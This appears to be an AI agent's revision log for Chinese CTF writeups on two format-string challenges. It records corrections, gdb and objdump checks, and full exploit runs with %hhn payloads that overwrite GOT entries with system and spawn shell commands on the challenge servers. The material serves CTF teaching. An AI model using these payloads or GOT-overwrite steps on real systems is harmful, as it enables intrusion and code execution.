# Review Round 2 修正紀錄 — pwn2 `mad_libs` / pwn3 `revolution` 格式化字串筆記（繁體中文）

修正者：fix agent（review round 2 後）
可動檔案：`pwn2/notes.md`、`pwn2/exploit.py`、`pwn3/notes.md`、`pwn3/exploit.py`（**沒有**改動 `wp/00`、`wp/99`、`wp/README.md`、其他 `pwnN/`）
原則：**每一條都先重新驗證再改**。驗證方法：`objdump -d -M intel`、`readelf -SW/-rW`、`gdb -q -batch`、
live process + `/proc/<pid>/maps` + `/proc/<pid>/mem`、pwntools、以及實際跑完 4 次 exploit。

統計：**已修 15 項**（E1–E8 共 8、F1–F6 共 6、外加術語一致性 1）、**已補 8 項**（N1–N8 新手卡點）、
**略過 3 項**（皆因「必須改 `wp/00`，不在本次可動檔案內」，已轉入 `wp/pending_wp00_fixes_from_fmtstr.md`）。
4 次 exploit 全部 **PASS**。

---

## 1. 錯誤清單（E / F / W）

| # | 嚴重度 | 檔案 | 動作 | 一行說明 |
|---|---|---|---|---|
| **E1** | 高 | `pwn2/notes.md` §9-5 | **已修** | 「`%17$hhn` 這 7 個字元本身也會增加 `%n` 計數」是錯的 → 改成「格式指令不印出任何字元、不貢獻計數；`%64c%17$hhn` 的計數是 64 不是 75」，並補上 `/proc/<pid>/mem` 自檢法。 |
| **E2** | 中 | `pwn2/notes.md` §1(2) | **已修** | `fgets(buf,0x100,stdin)` 的 size=256 → 最多讀 **255** 字元 + NUL → 最高寫到 `buf[255]` = **`rbp-0x11`**（原寫 `0x100` 位元組／`rbp-0x10`）。 |
| **E3** | 高 | `pwn2/notes.md` §3.4 ＋ `pwn2/exploit.py` docstring/註解 | **已修** | `write_size_max` **預設是 `'long'`**，所以 `write_size='byte'` 不一定產生 6 個 `%hhn`（會被合併成 `%hn`/`%n`，填充可能到 1097 字元）→ notes 與 docstring 都改成描述真實行為，並說明 `write_size_max='byte'` 才是「保證只用 `%hhn`」。 |
| **E4** | 中 | `pwn2/notes.md` §3.4 對齊說明 | **已修** | 推導中間的 `buf[64]` 是錯的 → 格式指令區長 **72 bytes**（66+6），第一個位址在 **`buf[72]`** → `72/8=9` → 參數 17；並補「不是 8 的倍數就會落在半個 slot → segfault」。 |
| **E5** | 中 | `pwn2/notes.md` §3.3 ＋ §9-1 | **已修** | slot 6/7 被標成「`i` 的殘留」是錯的：`i` 在 `[rbp-0x114]`＝**slot 7 的高 4 bytes**，而 `printf(buf)` 跑在第一次迴圈時 `i=0`；slot 6 與 `i` 無關；`0xe` 不可能是 `i`（只會 0~7）。並註明這些殘留每次可能不同。 |
| **E6** | 低 | `pwn2/notes.md` §9-14 | **已修** | 本機其實**看不到** `sh: -c:` 訊息（`drain()` 把它讀掉丟棄）→ 改寫成「bash/dash 訊息內容不同、本 exploit 刻意吞掉、不要靠它判斷成功，要看 GOT」。 |
| **E7** | 低 | `pwn2/notes.md` §7 開頭 | **已修** | §7 引用的一行版 `canary, saved_rbp, ret, mainp = (int(x,16) ...)` 不是 `exploit.py` 的內容 → 在 §7 開頭標明「精簡版、省略 `try/except`」，並指出真版本在 `exploit.py:109-127`、`(nil)` 會丟例外。 |
| **E8** | 低 | `pwn2/notes.md` §8 ＋ §3.4 | **已修** | payload 長度／組成隨 ASLR 改變（96/112/120 bytes、`%hhn`/`%hn`/`%n`）→ §8 開頭加「先讀這句」說明，並把 §3.4 的單一範例標為「範例之一」+ 列出其他實測變體。 |
| **F1** | 高 | `pwn3/notes.md` §7.2 | **已修** | 堆疊圖把 `printf` 保存的 `rbx` 標在 `buf-0x10` → 正確是 **`buf-0x38`**（六個 push = 0x30）；補上 `buf-0x10`=r15、`buf-0x18`=r14/r13/r12/rbp 的完整表格與推導。 |
| **F2** | 高 | `pwn3/notes.md` §4.1 | **已修** | 唯一直接證據的 gdb 步驟不可執行（`-ex '...'` 佔位符、`run < <(printf ...)` 在 dash 會炸）→ 改成**可直接貼上執行**的版本（先 `printf ... > /tmp/rev_in`），補上 `x/1gx $rsp+0xe8` / `$rsp+0x120` 與每個 `-ex` 的意義表。實際跑過，輸出已貼進筆記。 |
| **F3** | 中 | `pwn3/notes.md` §7.1 | **已修** | `.init_array`／`.fini_array` 內容寫反 → 正解：`0x403dc0` = `[0x4012b0(frame_dummy), 0x401190(setvbuf stdio init)]`、`0x403dd0` = `[0x401280(dtors)]`；補上 `objdump -s -j .init_array/.fini_array` 驗證指令，並指出 `0x401190` 就是 §8.3「GOT 一定已解析」的機制證據。 |
| **F4** | 中 | `pwn3/notes.md` §9.2 ＋ §11-6 | **已修** | 「只能執行一行」只在遠端成立 → §9.2 改成**遠端/本機對照表**（本機 Arch 實測連送三行都存活、還多印 `score> `），§11-6 改成「不要依賴這個行為」。 |
| **F5** | 中 | `pwn3/notes.md` §9 | **已修** | §9 引用的是改寫版 → 開頭標明「精簡版，對照請看 `exploit.py`」，並補上真實檔案有的 4 個 `assert`、`_argv = list(sys.argv[1:])`、`process(BINARY)`、`out = ...; assert out == b'ok'`、以及 `COMMANDS` 的完整內容。 |
| **F6** | 低 | `pwn3/notes.md` §10 | **已修** | §10.1／§10.2 是節錄 → 標明本機 flag 會印**兩次**、結尾多一行 `score> `；遠端另有一整段 `ls -la /`，並指向 `local_run.log`／`remote_run.log`。 |
| **W1** | 高 | `wp/00_基礎知識_從零開始.md:883`／`:440` | **略過（不在可動檔案內）** | 這兩個矛盾（pwn3 說成 `.bss` 溢寫／`memcpy` 長度問題）**必須改 `wp/00`**，而 `wp/00` 由別的 agent 負責 → 已完整寫進 **`wp/pending_wp00_fixes_from_fmtstr.md`**（含建議替換文字）。 |

### 額外修正（review §3 術語一致性項目）

| 項目 | 檔案 | 動作 | 說明 |
|---|---|---|---|
| `jle` 沒說「有號」 | `pwn2/notes.md` §2.1 | **已修** | `cmp` 那列改成「`jle` = （**有號**）小於等於就跳、`ja` = （**無號**）大於就跳」，與 `wp/00` §5.2 的措辭對齊。 |
| 「一定要 `cd` 進題目目錄」 | `wp/00` §12 | **略過（需改 `wp/00`）** | 本系列 exploit 用 `os.path.dirname(__file__)` 組絕對路徑 → 列入 pending 清單。 |
| `wp/00` 名詞表/§12 缺術語 | `wp/00` | **略過（需改 `wp/00`）** | `IFUNC`、`va_list` 家族、`setvbuf/_IONBF`、`fmtstr_payload`/`FmtStr` 的清單與最小範例建議 → 列入 pending 清單。 |

---

## 2. 新手卡點（N1–N8）— 全部已補

| # | 檔案／位置 | 動作 | 補了什麼 |
|---|---|---|---|
| **N1** | `pwn3/notes.md` §5（★★ 關鍵技巧之前） | **已補** | 新增「★ 不靠 gdb 也能自己驗證 arg6 = buf、arg14 = buf+0x40」段落：marker 法 Python 腳本 + 實測輸出（`%6$p` → `0x0000000070243625`、`%14$p` → `0x4242424241414141`）。**我重跑過，兩筆輸出完全一致。** |
| **N2** | `pwn3/notes.md` §2.5 | **已補** | 「什麼是 IFUNC？」段落：選擇器 vs 被挑中的實作（`strcspn@got - base = 0x1935c0` vs `readelf -s` 的 `0xaf070`），並說明為何不能拿 IFUNC 當指紋。 |
| **N3** | `pwn2/notes.md` §7（`context.arch` 之後） | **已補** | ⚠️ 警告：`context.arch="amd64"` 必須在 `fmtstr_payload()`／`p64()` 之前設，否則 `ValueError: pack(): number does not fit within word_size`（預設 32-bit）。 |
| **N4** | `pwn2/notes.md` §3.4 開頭 | **已補** | 「計數器怎麼算？」小節：`%c` 貢獻填充長度、裸字元貢獻 1/字元、**格式指令貢獻 0**（與 E1 一致）。 |
| **N5** | `pwn2/notes.md` §5 | **已補** | 完整可跑的 `/proc/<pid>/maps` 對照 + **`/proc/<pid>/mem` 自檢腳本**（`selfcheck.py`）：印出 `printf@GOT before/after` 與 `match=True`，並附上我自己跑的實測輸出。 |
| **N6** | `pwn3/notes.md` §1.2 | **已補** | `_IONBF = 2` 是「不緩衝」的白話解釋，以及它與 `recvuntil(b'score> ')`、pwn2 §2.4 的關係。 |
| **N7** | `pwn2/notes.md` §9-13 ＋ `pwn3/notes.md` §11-1 | **已補** | 說明 `args.REMOTE`（官方用法）仍然是 `True`，只有「自己解析 `sys.argv[1]`」才會被 `pwnlib.args` 吃掉，兩份文件不再看起來矛盾。 |
| **N8** | `pwn3/notes.md` §11-3 | **已補** | `%N$s` 撞到未映射頁會 SIGSEGV（`strlen` 一讀就爆）→ 逐 byte 探測只適用於確定 mapped 的位址。 |

---

## 3. 驗證紀錄（本輪實際執行）

### 3.1 E1〔關鍵〕：格式指令到底算不算進 `%n` 的計數？→ **答案：不算**

手寫 `%64c%17$hhn`（格式指令區補 `'a'` 到 72 bytes，讓位址落在 arg17），目標是一位於
`PIE+0x4038` 的**無害可寫位址**（`.data` 之後的填充，不在 GNU_RELRO 內），寫完直接讀回：

```console
$ python3 /tmp/e1_direct2.py
before = 0x0
after  = 0x40  (最低 byte = 0x40)
=> 若 %17$hhn 這 7 個字元也計數會是 0x47 ; 實際 0x40 (=64) → 格式指令不計數
```

* 若格式指令本身計數 → 會寫入 `64 + 7 = 71 = 0x47`；**實際是 `0x40` = 64**。
* 另一條獨立驗證：走完整 exploit 後讀 `printf@GOT`，最低 byte 也正好是 `0x40`（= `system` 的最低 byte）。
* ⚠️ 附帶說明（複審者敘述不精確處）：複審者寫「payload 以 `%64c%17$hhn` 開頭」，
  但我實跑時 `fmtstr_payload` 產生的 payload 開頭是 `%43c%16$hhn...`（排序後第一個寫入不一定是 GOT+0）。
  **結論（格式指令不計數）正確**，只是「payload 一定以 `%64c%17$hhn` 開頭」不成立 → 我改用上面的手寫測試來證明。

### 3.2 E2 / E3 / E4 靜態複驗

```console
$ objdump -d -M intel mad_libs | sed -n '/123e:/,/1246:/p'
    123e:	be 00 01 00 00       	mov    esi,0x100      # size=256 → 最多 255 字元 + NUL → 最高寫到 rbp-0x11 ✅
    1246:	e8 75 fe ff ff       	call   10c0 <fgets@plt>

$ python3 -c "from pwn import *; context.arch='amd64'
w={0x5845447ea010: p64(0x73979e04e740)[:6]}
print(fmtstr_payload(8,w,write_size='byte',numbwritten=0,badbytes=b'\n')[:70])
print(fmtstr_payload(8,w,write_size='byte',write_size_max='byte',numbwritten=0,badbytes=b'\n')[:70])"
default (max=long): b'%64c%15$hhn%51c%16$hhn%36c%17$hhn%7c%18$hhn%1097c%19$hna...'   # ← 被合併成 %hn，填充 1097 ✅
max=byte          : b'%4c%16$hhn%60c%17$hhn%51c%18$hhn%36c%19$hhn%7c%20$hhn%73c%21$hhn...'  # ← 才是 6 個 %hhn ✅

$ python3 -c "p=b'%64c%17\$hhn%52c%18\$hhn%14c%19\$hhn%68c%20\$hhn%12c%21\$hhn%21c%22\$hhnaaaaba'; print(len(p), len(p)//8, 8+len(p)//8)"
72 9 17                                                                          # ← 第一個位址在 buf[72] ✅
```

### 3.3 E5 / F1 / F2 / F3 / F4 複驗

```console
# E5：pos6/pos7 不是 i（本次跑出 0x100000 / 0x40，複審者跑出 (nil)/(nil)、(0x2)/(0xe)）
b'AAAABBBB0x...|0xfbad2088|...|(nil)|0x100000|0x40|0x4242424241414141|...'
#                                    pos5   pos6    pos7   pos8 = "AAAABBBB" ✅

# F1/F2：gdb 可直接貼、輸出可重現（buf=0x7fffffffdbe0）
$ printf '%6$p\n' > /tmp/rev_in
$ gdb -q -batch -ex 'file ./revolution' -ex 'break *0x4013d9' -ex 'run < /tmp/rev_in' \
      -ex 'p/x $rsp' -ex 'p/x $rsp+0x120' -ex 'info registers rdi r15' \
      -ex 'x/1gx $rsp+0xe8' -ex 'x/1gx $rsp+0x120'
$1 = 0x7fffffffdac0
$2 = 0x7fffffffdbe0                      # rsp+0x120 == overflow_arg_area == buf ✅
rdi            0x7fffffffdbe0
r15            0x7fffffffdbe0
0x7fffffffdba8:	0x00007fffffffdbe0       # [rsp+0xe8] = buf-0x38 = 保存的 rbx = buf ✅（不是 buf-0x10）
0x7fffffffdbe0:	0x0000000070243625       # [buf] 前 8 bytes = "%6$p\0\0\0\0" ✅

# F3：arrays 內容
$ objdump -s -j .init_array revolution   → 403dc0 b0124000... 90114000...   # 0x4012b0, 0x401190 ✅
$ objdump -s -j .fini_array revolution   → 403dd0 80124000...               # 0x401280 ✅
$ objdump -d --start-address=0x401190 revolution  → call setvbuf(stdout,…2,0); call setvbuf(stderr,…2,0) ✅

# F4：本機把 strcspn@got 換成 system 之後「連送三行都存活」
setvbuf=0x7f9076e843f0 base=0x7f9076e00000 system=0x7f9076e54580
after cmd 1: b'ONE\n\nscore> '
after cmd 2: b'TWO\n\nscore> '
after cmd 3: b'THREE\n\nscore> '      # ← 本機不會 SIGSEGV，所以「只能一行」只在遠端成立 ✅
```

### 3.4 N1 複驗（pwn3 marker 法）

```console
arg6 = b'0x0000000070243625'
scan = b'0x2437257c70243625|0x7c70243431257c70|0x4242424241414141|0x4444444443434343'
```
→ `arg14 = buf+0x40`（`"AAAABBBB"`）、`arg15 = buf+0x48`（`"CCCCDDDD"`）✅ 與複審者的建議文字完全一致。

---

## 4. 四次 exploit 重跑結果（全部 PASS ✅，以下為真實輸出）

### 4.1 `cd pwn2 && python3 exploit.py < /dev/null` → **PASS**

```console
[*] === attempt 1/5 ===
[*] starting local process with the bundled loader/libc
[+] Starting local process '/home/kzzz/Documents/code/ctf/sunshine/pwn2/./ld-linux-x86-64.so.2': pid 3546657
[*] leak line: 0x71222def008fe800|0x7ffe2138e0a0|0x7f4ab142a1ca|0x7f4ab16a51c9
[+] canary      = 0x71222def008fe800
[+] saved rbp   = 0x7ffe2138e0a0
[+] libc leak   = 0x7f4ab142a1ca  -> libc base = 0x7f4ab1400000
[+] main leak   = 0x7f4ab16a51c9  -> PIE  base = 0x7f4ab16a4000
[+] system      = 0x7f4ab1458740
[+] printf@GOT  = 0x7f4ab16a8010
[*] write payload (112 bytes): b'%64c%16$hhn%5c%17$hhn%5c%18$hhn%53c%19$hhn%8c%20$hhn%42c%21$hhna\x10\x80j\xb1J\x7f\x00\x00\x12\x80j\xb1J\x7f\x00\x00\x14\x80j\xb1J\x7f\x00\x00\x15\x80j\xb1J\x7f\x00\x00\x11\x80j\xb1J\x7f\x00\x00\x13\x80j\xb1J\x7f\x00\x00'
[*] printf@GOT should now contain system()
[*] Stopped process '/home/kzzz/Documents/code/ctf/sunshine/pwn2/./ld-linux-x86-64.so.2' (pid 3546657)
sun{LOCAL_DUMMY_FLAG}
total 2408
drwxr-xr-x  2 kzzz kzzz    4096 Sep 28 01:03 .
-rw-r--r--  1 kzzz kzzz      22 Sep 28 00:15 flag.txt
-rw-r--r--  1 kzzz kzzz      27 Sep 28 00:24 FLAG.txt
uid=1001(kzzz) gid=1001(kzzz) groups=1001(kzzz),65534(nobody)
DONE

FLAG: sun{LOCAL_DUMMY_FLAG}
```
（驗算：`0x7f4ab142a1ca − 0x2a1ca = 0x7f4ab1400000` ✅ 頁對齊、`0x7f4ab16a51c9 − 0x11c9 = 0x7f4ab16a4000` ✅。
這次剛好是 **112 bytes、6 個 `%hhn`** —— 與 §3.4「組成每次可能不同」相符。）

### 4.2 `cd pwn2 && python3 exploit.py REMOTE < /dev/null` → **PASS**

```console
[+] Opening connection to chal.sunshinectf.games on port 26001: Done
[*] leak line: 0xe22c5a116a043c00|0x7ffe7a49c6e0|0x715e378d81ca|0x57e70bcb11c9
[+] canary      = 0xe22c5a116a043c00
[+] saved rbp   = 0x7ffe7a49c6e0
[+] libc leak   = 0x715e378d81ca  -> libc base = 0x715e378ae000
[+] main leak   = 0x57e70bcb11c9  -> PIE  base = 0x57e70bcb0000
[+] system      = 0x715e37906740
[+] printf@GOT  = 0x57e70bcb4010
[*] write payload (112 bytes): b'%55c%16$hhn%9c%17$hhn%30c%18$hhn%9c%19$hhn%10c%20$hhn%31c%21$hhn\x13@\xcb\x0b\xe7W\x00\x00\x10@\xcb\x0b\xe7W\x00\x00\x14@\xcb\x0b\xe7W\x00\x00\x11@\xcb\x0b\xe7W\x00\x00\x15@\xcb\x0b\xe7W\x00\x00\x12@\xcb\x0b\xe7W\x00\x00'
[*] printf@GOT should now contain system()
[*] Closed connection to chal.sunshinectf.games port 26001
sun{f1ll_iN_th3_g0T_eNtry}
total 12
drwxr-xr-x 2 root root     4096 Sep 26 00:21 .
drwxr-xr-x 1 root root     4096 Sep 26 00:54 ..
-rw-r----- 1 root mad_libs   27 Sep 26 00:13 flag.txt
uid=1337(mad_libs) gid=1337(mad_libs) groups=1337(mad_libs)
DONE

FLAG: sun{f1ll_iN_th3_g0T_eNtry}
```
（與 `pwn2/FLAG.txt` 的真 flag 一致 ✅；一次 attempt 1/5 就成功。）

### 4.3 `cd pwn3 && python3 exploit.py < /dev/null` → **PASS**

```console
[*] mode      : LOCAL /home/kzzz/Documents/code/ctf/sunshine/pwn3/revolution
[*] target libc: local libc /usr/lib/libc.so.6
[+] Starting local process '/home/kzzz/Documents/code/ctf/sunshine/pwn3/revolution': pid 3547013
[*] code probe @0x4010d0 = f30f1efa4154ba1f
[+] setvbuf@libc = 0x7f22eaa843f0   ->   libc base = 0x7f22eaa00000
[*] &_IO_2_1_stdout_ = 0x7f22eac17580 (base+0x217580)
[+] system = 0x7f22eaa54580
[+] strcspn@got overwritten -> main() runs system(buf) on the next line
sun{LOCAL_TEST_FLAG}
sun{LOCAL_TEST_FLAG}          ← 出現兩次：COMMANDS 同時 cat flag.txt 與本機絕對路徑（§10.1 已標註）
total 2216
...
uid=1001(kzzz) gid=1001(kzzz) groups=1001(kzzz),65534(nobody)
DONE

score>                        ← 本機不會 SIGSEGV（§9.2 已改成遠端/本機對照表）
FLAG: sun{LOCAL_TEST_FLAG}
```

### 4.4 `cd pwn3 && python3 exploit.py REMOTE < /dev/null` → **PASS**

```console
[*] mode      : REMOTE chal.sunshinectf.games:26002
[*] target libc: libc6_2.39-0ubuntu8.3 (Ubuntu 24.04)
[*] code probe @0x4010d0 = f30f1efa4154ba1f
[+] setvbuf@libc = 0x7cdb34ece540   ->   libc base = 0x7cdb34e46000
[*] &_IO_2_1_stdout_ = 0x7cdb3504a5c0 (base+0x2045c0)      ← 交叉驗證吻合 ✅
[+] system = 0x7cdb34e9e740
[+] strcspn@got overwritten -> main() runs system(buf) on the next line
sun{cust0m_fmtstr_n0_t00ls_4ll0wed}
uid=1337(revolution) gid=1337(revolution) groups=1337(revolution)
DONE
FLAG: sun{cust0m_fmtstr_n0_t00ls_4ll0wed}
```
（`0x7cdb34ece540 − 0x88540 = 0x7cdb34e46000` ✅ 頁對齊、`stdout` 差 `0x2045c0` 完全吻合 ✅）

**四次總結：pwn2 local PASS、pwn2 REMOTE PASS、pwn3 local PASS、pwn3 REMOTE PASS。**

---

## 5. 略過項目（含原因）

| 項目 | 原因 |
|---|---|
| **W1**（`wp/00:883`、`wp/00:440` 對 pwn3 的描述與 `pwn3/notes.md` §11-7 矛盾） | 需要修改 `wp/00_基礎知識_從零開始.md`，**該檔不在本次可動清單內**（由其他 agent 負責）→ 已完整寫入 `wp/pending_wp00_fixes_from_fmtstr.md`，含建議替換文字與驗證方式。 |
| 「一定要 `cd` 進題目目錄」的警告 | 同上，屬 `wp/00` §12 的內容 → 列入 pending 清單。 |
| `wp/00` 名詞表／§12 API 清單補 `IFUNC`、`va_list`、`fmtstr_payload`／`FmtStr` | 同上，屬 `wp/00` → 列入 pending 清單。（`pwn3/notes.md` 已自行補上 IFUNC 與 `_IONBF` 的定義，所以兩題本身已自足。） |

### 複審者敘述中不精確、我沒有照抄的地方（供下一輪參考）

1. **E1 的驗證腳本敘述**：複審者說「實測 payload 以 `%64c%17$hhn` 開頭」——
   我重跑時 `fmtstr_payload` 產生的 payload 開頭是 `%43c%16$hhn...`（排序後不保證從 GOT+0 開始）。
   **結論本身正確**（格式指令不計數），但我改用「手寫 `%64c%17$hhn` 寫無害位址再讀回」的方式取得決定性證據（`0x40`，不是 `0x47`）。
2. **F2 建議的 gdb 指令**：`-ex 'break *0x4013d9' \    # 註解` 這種寫法**在 bash 裡是壞的**
   （反斜線後面接空白就不再是換行續接，下一行會變成獨立指令）→ 我合併成單一命令、把說明移到 prose/表格。
3. **F2 建議的輸出片段**：把 `x/1gx $rsp+0xe8` 的輸出寫成 `[buf]` 的內容（`0x0000000070243625`）——
   那其實是 `x/1gx $rsp+0x120` 的輸出。筆記裡我兩個指令都放上，各自標明正確語意。
4. **E3 的「本機第一次跑就出現 `%17$n`」**：我這輪跑的兩次（本機＋遠端）都是 **112 bytes、6 個 `%hhn`**，
   沒有重現 `%17$n`。這不是錯誤（合併結果取決於該次位址），但筆記已改成「不固定 + 舉多個實例」，而不是斷言某一種。

---

## 6. 本次改動的檔案

| 檔案 | 改動摘要 |
|---|---|
| `pwn2/notes.md` | E1–E8 全部修正；新增 §5 `/proc/<pid>/mem` 自檢腳本、§3.4 計數器小節、§7 `context.arch` 警告、§9-13 `args.REMOTE` 說明；§2.1 `jle`/`ja` 有號/無號；§8 加「組成會變」的前言。 |
| `pwn2/exploit.py` | `build_write_payload()` docstring 改成描述 `write_size_max` 的真實行為（註解／docstring 專案檔註解層）；檔案開頭的攻擊計畫註解同步更正。**程式邏輯與參數完全沒動**（4 次實測仍 PASS）。 |
| `pwn3/notes.md` | F1–F6 全部修正（§4.1 可執行 gdb 步驟、§7.1 arrays、§7.2 堆疊圖與 `buf-0x38` 推導表、§9.2 遠端/本機對照表、§9 精簡版聲明+真實 assert、§10 節錄說明）；新增 §5 marker 法（N1）、§2.5 IFUNC（N2）、§1.2 `_IONBF`（N6）、§11-1 `args.REMOTE`（N7）、§11-3 SIGSEGV 風險（N8）。 |
| `pwn3/exploit.py` | step 3 的「only ONE command line works」註解改成「實作相依、本機不會爆、不要用行數判斷成功」。**程式邏輯沒動**（4 次實測仍 PASS）。 |
| `wp/fixes_round2_fmtstr.md` | 本檔案（修正紀錄）。 |
| `wp/pending_wp00_fixes_from_fmtstr.md` | 轉交其他 agent 的 `wp/00` 修正清單。 |
